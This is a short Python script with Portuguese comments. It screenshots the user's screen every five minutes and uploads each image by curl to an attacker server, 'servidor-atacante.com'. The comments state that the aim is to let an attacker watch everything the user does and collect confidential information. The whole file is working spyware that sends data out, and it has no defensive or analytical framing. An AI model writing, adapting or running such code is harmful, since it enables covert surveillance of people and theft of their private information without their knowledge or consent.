import os
import time
import pyautogui

# Fica em loop para rastrear as atividades do usuário
while True:
    # Captura a tela
    imagem = pyautogui.screenshot()
    imagem.save("captura.png")

    # Envia a imagem para o servidor do atacante
    os.system("curl -F 'file=@captura.png' http://servidor-atacante.com/upload")

    # Dorme por 5 minutos antes de fazer a próxima captura
    time.sleep(300)
    
    #Esse código fica em loop para capturar a tela do usuário a cada 5 minutos e enviar a imagem para o servidor do atacante. 
    # Isso permite que o atacante veja tudo o que o usuário está fazendo no dispositivo e colete informações confidenciais.